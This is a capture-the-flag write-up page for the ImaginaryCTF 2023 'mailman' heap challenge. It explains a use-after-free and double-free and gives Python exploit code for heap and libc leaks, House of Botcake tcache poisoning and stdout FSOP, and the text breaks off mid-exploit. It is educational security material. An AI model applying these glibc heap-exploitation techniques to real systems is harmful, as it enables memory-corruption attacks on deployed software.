@@ -1,0 +1,590 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\ImaginaryCTF 2023">ImaginaryCTF 2023</a>
+            <a href="/CTF-writeups\ImaginaryCTF 2023\mailman/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>mailman</span>
+            <span class="text-right">[423]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>We are given a binary along with a corresponding libc.</p>
+<blockquote>
+<p><strong>Description</strong><br />
+I'm sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...</p>
+<p>Flag is in <code>./flag.txt</code>.</p>
+<p><strong>Attachments</strong><br />
+<a href="https://imaginaryctf.org/r/PIxtO#vuln">https://imaginaryctf.org/r/PIxtO#vuln</a> <a href="https://imaginaryctf.org/r/c9Mk8#libc.so.6">https://imaginaryctf.org/r/c9Mk8#libc.so.6</a> <code>nc mailman.chal.imaginaryctf.org 1337</code></p>
+</blockquote>
+<hr />
+<h2>Recon</h2>
+<p>Jumping straight into the disassembly, we immediately find the following seccomp filter being applied in <code>main</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seccomp_init</span><span class="p">(</span><span class="mf">0L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="n">envp</span><span class="p">);</span><span class="w"></span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span><span class="w"> </span><span class="mf">2147418112L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">2L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span><span class="w"></span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span><span class="w"> </span><span class="mf">2147418112L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span><span class="w"></span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span><span class="w"> </span><span class="mf">2147418112L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">1L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span><span class="w"></span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span><span class="w"> </span><span class="mf">2147418112L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">5L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span><span class="w"></span>
+<span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span><span class="w"> </span><span class="mf">2147418112L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">60L</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span><span class="w"></span>
+<span class="n">seccomp_load</span><span class="p">(</span><span class="n">filter</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+
+<p>These are the syscalls corresponding to:</p>
+<ul>
+<li>
+<p>open</p>
+</li>
+<li>
+<p>read</p>
+</li>
+<li>
+<p>write</p>
+</li>
+<li>
+<p>fstat</p>
+</li>
+<li>
+<p>exit</p>
+</li>
+</ul>
+<p>As such, there will be no shells for this challenge. Funnily enough, only the exit syscall is allowed, not the exit_group syscall, which is what libc uses to exit (not that it matters, but I thought that was funny).</p>
+<p>Reading further into <code>main</code>, we find a heap-note program, where we are able to write, send and read letters, corresponding to create, free and read. Let's first check out the write routine:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inidx</span><span class="p">();</span><span class="w"></span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;letter size: &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%lu%*c&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<span class="n">mem</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span><span class="w"></span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;content: &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">mem</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span><span class="w"> </span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+
+<p>As expected, we are prompted for size and contents. Interestingly, size is not subject to any sanity checks.</p>
+<p>Checking out the send routine, we quickly find the bug:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inidx</span><span class="p">();</span><span class="w"></span>
+<span class="n">free</span><span class="p">(</span><span class="n">mem</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w"></span>
+</code></pre></div>
+
+<p>While the pointer is indeed freed, it is never removed, leaving us with a dangling pointer. This leaves two vulnerabilities, namely an RAF (read after free) and a double-free. The former will be useful for getting leaks, while the latter will be used for exploitation.</p>
+<p>As our exploit will be highly dependent on libc version, knowing it will be important:</p>
+<div class="codehilite"><pre><span></span><code>$ ./libc.so.6 
+GNU C Library <span class="o">(</span>Ubuntu GLIBC <span class="m">2</span>.35-0ubuntu3.1<span class="o">)</span> stable release version <span class="m">2</span>.35.
+Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2022</span> Free Software Foundation, Inc.
+This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.
+There is NO warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version <span class="m">11</span>.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+</code></pre></div>
+
+<p>The libc version is 2.35; this means no malloc hooks, tcache keys and pointer mangling on both the tcache and fastbin. Using checksec shows the full suite of protections:</p>
+<div class="codehilite"><pre><span></span><code>$ checksec ./vuln
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/pwn/ctf/ImaginaryCTF2023/mailman/vuln&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div>
+
+<p>Lacking both hooks and GOT overwrites, getting code execution will be more interesting.</p>
+<hr />
+<h2>Exploitation</h2>
+<h3>Getting leaks</h3>
+<p>As mentioned earlier, the RAF bug gives us ample opportunity to get leaks. I will be aiming for both heap and libc leaks, as both will be necessary for this exploit. Getting a heap leak is easy, simply free a tcache size chunk and read from it. Assuming the given bin is empty, the chunk will contain a mangled pointer to the heap, according to this formula:</p>
+<p>
+<script type="math/tex; mode=display">\text{NP}=(\text{L}\space>>\space12)\space\oplus\space \text{P}</script>
+</p>
+<p>NP is the stored pointer, L is address of the given chunk, and P is the original pointer. As the chunk is the last element in the list, P will be null. As such, we are left with the right-shifted L, containing the ASLR subjected part of a heap pointer. I wrote the following code to extract this:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">write_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Free a chunk into an empty tcache bin</span>
+
+<span class="n">guard</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">read_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">guard</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>  <span class="c1"># Our chunk is 2 pages away from heap base</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;guard: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">guard</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We can extrapolate the heap address from the guard, by left-shifting it by 12. In this case, seccomp seems to leave a lot of garbage on the heap, pushing the address of our given chunk two pages down.</p>
+<p>Getting a libc pointer is easy given the restrictions. Since we can request chunks of arbitrary size, we can simply allocate and free a chunk larger than what tcache serves, which will instead be linked into the unsortedbin. It will then contain a pointer to the main arena:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">write_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;Guard&quot;</span><span class="p">)</span>  <span class="c1"># Guard chunk to avoid consolidation</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">read_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">main_arena</span> <span class="o">-</span> <span class="mi">96</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Notice the extra chunk being allocated to avoid consolidation with the top chunk. We can instead combine the two leaks to clean it up a bit:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">write_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Chunk large enough to not fit into tcache</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x1a8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Chunk large enough to not come from remaindering</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Free a chunk into the unsortedbin</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Free a chunk into an empty tcache bin</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">read_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">main_arena</span> <span class="o">-</span> <span class="mi">96</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">guard</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">read_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">guard</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>  <span class="c1"># Our chunk is 2 pages away from heap base</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;guard: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">guard</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>I had to change the size of the second chunk, such that it didn't come from remaindering, but instead was allocated from the top chunk.</p>
+<h3>How to get an arb-write?</h3>
+<p>For this challenge, we are working with a quite new libc version. This has a significant impact on what methods we can use to achieve an arbitrary write. First of all, a conventional tcache dup is out of the question, since tcache keys were introduced in libc version 2.29. </p>
+<p>Additionally, the updated method using tcache dumping also doesn't work, at least not how it's usually performed. As the fake chunk is dumped into the tcache, malloc will follow the fd, demangling the fake chunks value as if it were an fd. This usually results in an unaligned or invalid address, which crashes the program. It can be bypassed by padding the bin with an extra chunks, in which case malloc doesn't seem to check it. (I have no idea why)</p>
+<p>However, in our scenario, there is another method, called the House of Botcake. It isn't really easier than the tcache dumping, but it allows back-to-back tcache poisoning, making it easy to overwrite multiple places when the attack has been set up.</p>
+<h3>House of Botcake</h3>
+<p>The House of Botcake can be described as follows:</p>
+<ol>
+<li>Allocate 7 chunks of a specific tcache bin size.</li>
+<li>Allocate two extra chunks A and B of the same size.</li>
+<li>Allocate a guard chunk to avoid top chunk consolidation.</li>
+<li>Free the 7 first chunks, filling the tcache bin.</li>
+<li>Free both chunk A and B, causing the two to consolidate.</li>
+<li>Allocate a garbage chunk to remove one chunk from the tcache bin.</li>
+<li>Free chunk B again, this time into the tcache.</li>
+<li>Allocate the consolidated chunk A+B, writing into chunk B's fd, poisoning the tcache chunk.</li>
+<li>Allocate another garbage chunk, the tcache now only contains your fake chunk.</li>
+<li>Allocate the fake chunk and write to it.</li>
+</ol>
+<p>The brilliance of the method is this: The consolidated chunk A+B and chunk B can be freed again, repeating the attack after step 8.</p>
+<p>Below is the code I wrote for this attack, minus the target address:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Step 1</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">12</span><span class="p">):</span>
+    <span class="n">write_letter</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;CCCC&quot;</span><span class="p">)</span>
+
+<span class="c1"># Step 2</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Chunk A</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;BBBB&quot;</span><span class="p">)</span>  <span class="c1"># Chunk B</span>
+
+<span class="c1"># Step 3</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;GGGG&quot;</span><span class="p">)</span>  <span class="c1"># Guard chunk</span>
+
+<span class="c1"># Step 4</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">12</span><span class="p">):</span>  <span class="c1"># Fill tcache</span>
+    <span class="n">send_letter</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="c1"># Step 5</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Free into unsortedbin, causing consolidation</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># Step 6</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;Garbage&quot;</span><span class="p">)</span>  <span class="c1"># Allocate garbage chunk to remove one chunk from tcache</span>
+
+<span class="c1"># Step 7</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Free chunk again, now into tcache</span>
+
+<span class="c1"># Step 8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span> <span class="o">^</span> <span class="n">guard</span><span class="p">)</span>  <span class="c1"># Mangle the target pointer</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Create a new chunk, overflowing the tcache chunk</span>
+
+<span class="c1"># Step 9</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+
+<span class="c1"># Step 10</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">20</span>  <span class="c1"># Very important payload</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Overwrite the target</span>
+</code></pre></div>
+
+<p>As with other tcache poisoning techniques, this comes with two restrictions:<br />
+1. The pointer must be 16-byte aligned.<br />
+2. The value at the pointer must be an address (don't know exactly why, but probably to do with pointer demangling).</p>
+<h3>Turning arb-write into code execution</h3>
+<p>This is all great, but I haven't addressed what we're actually going to do with this. Usually, arb-write is very close to code execution, usually due to malloc hooks. But in our case, we have no such luxury, and we even have to contend with seccomp.</p>
+<p>Reading the writeups after the competition was over, I saw multiple unique methods. Intended seems to have been a file stream exploit that people referred to as House of Apple. Another method was using <code>strlen</code> virtual functions to hijack control.</p>
+<p>At the time of writing my exploit, I didn't know any of these methods. I experimented with a common attack vector, that being the <code>exit_funcs</code> registered by <code>atexit</code>. I was indeed able to hijack the struct, but it was all for nothing, as the program used <code>_exit</code> to terminate operation, which bypasses the exit functions entirely (I believe malloc-related aborts do the same, due to patches for exploits such as House of Orange).</p>
+<p>A later idea was to hijack code execution through the stack. The problem is getting a stack leak, which isn't possible by simply duping into a stack pointer in libc, as the program uses <code>fgets</code> that always null terminates. I eventually remembered a method I had read about a while ago, which abused stdout to leak arbitrary memory.</p>
+<h3>FSOP on stdout</h3>
+<p>For optimization reasons, libc uses buffering to reduce IO overhead. This is applied not only to files opened via <code>fopen</code>, but also the three standard file descriptors; stdin, stdout and stderr. This is all managed through the <code>_IO_FILE</code> structure.</p>
+<p>It turns out, that by setting the values inside stdout's <code>_IO_FILE</code> structure very carefully, you can trick libc into flushing a fake buffer. Luckily, there happens to be a place in libc holding stack pointers, that being <code>environ</code>, which resides in a memory segment right before libc. If we can simply point the stdout struct to this memory, we should be able to get a stack leak.</p>
+<p>The <code>_IO_FILE</code> struct is as follows:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_flags</span><span class="p">;</span><span class="w">       </span><span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span><span class="w">   </span><span class="cm">/* Current read pointer */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span><span class="w">   </span><span class="cm">/* End of get area. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Start of putback+get area. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Start of put area. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Current put pointer. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span><span class="w">  </span><span class="cm">/* End of put area. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span><span class="w">   </span><span class="cm">/* Start of reserve area. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span><span class="w">    </span><span class="cm">/* End of reserve area. */</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* The following fields are used to support backing up and undo. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Pointer to start of non-current get area. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Pointer to first valid character of backup area */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Pointer to end of non-current get area. */</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_marker</span><span class="w"> </span><span class="o">*</span><span class="n">_markers</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="o">*</span><span class="n">_chain</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_fileno</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_flags2</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">__off_t</span><span class="w"> </span><span class="n">_old_offset</span><span class="p">;</span><span class="w"> </span><span class="cm">/* This used to be _offset but it&#39;s too small.  */</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span><span class="w"></span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="w"> </span><span class="n">_cur_column</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">signed</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">_vtable_offset</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">_IO_lock_t</span><span class="w"> </span><span class="o">*</span><span class="n">_lock</span><span class="p">;</span><span class="w"></span>
+<span class="cp">#ifdef _IO_USE_OLD_IO_FILE</span>
+<span class="p">};</span><span class="w"></span>
+</code></pre></div>
+
+<p>The values we need to overwrite are these:</p>
+<ul>
+<li>
+<p><code>_IO_FILE-&gt;_flags</code> = 0x0fbad1887</p>
+</li>
+<li>
+<p><code>_IO_FILE-&gt;_IO_write_base</code> = Start of memory to leak</p>
+</li>
+<li>
+<p><code>_IO_FILE-&gt;_IO_write_ptr</code> = End of memory to leak</p>
+</li>
+<li>
+<p><code>_IO_FILE-&gt;_IO_write_end</code> = End of memory to leak</p>
+</li>
+</ul>
+<p>This took a bit of experimentation. libc doesn't seem to react well to small memory segments, perhaps because it attempts to free something that isn't a chunk (I don't know for sure). But placing ptr and end about 0x200 ahead of base seems to work, in fact, it doesn't introduce any instability, which I had feared.</p>
+<p>The code to overwrite stdout is as follows:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Step 8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stderr_</span> <span class="o">+</span> <span class="mi">160</span><span class="p">)</span> <span class="o">^</span> <span class="n">guard</span><span class="p">)</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Create a new chunk, overflowing into the tcache chunk</span>
+
+<span class="c1"># Step 9</span>
